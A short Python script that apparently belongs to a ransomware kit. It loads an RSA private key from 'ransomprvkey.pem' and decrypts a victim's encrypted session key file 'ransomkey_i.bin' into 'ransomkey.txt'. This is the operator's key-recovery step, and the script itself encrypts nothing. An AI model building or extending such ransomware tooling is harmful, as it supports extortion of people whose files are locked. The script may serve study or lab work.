from os.path import exists
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

# checking if encrypted_session_key file exists or not
if not exists("ransomkey_i.bin"):
    print("file 'ransomkey_i.bin' not found..")
    exit(1)

# loading private key
with open("ransomprvkey.pem", "rb") as f:
    private_key = RSA.import_key(f.read())

# instantiating RSA cipher with private key
cipher_rsa = PKCS1_OAEP.new(private_key)

# loading encrypted data
encrypted_data = []
with open("ransomkey_i.bin", "rb") as f:
    while True:
        data = f.read(private_key.size_in_bytes())
        if data == b'':
            break
        encrypted_data.append(data)

# decrypting data
decrypted_data = []
for data in encrypted_data:
    decrypted_data.append(cipher_rsa.decrypt(data))

# storing decrypted data
with open("ransomkey.txt", "wb") as f:
    for data in decrypted_data:
        f.write(data + "\n".encode('ascii'))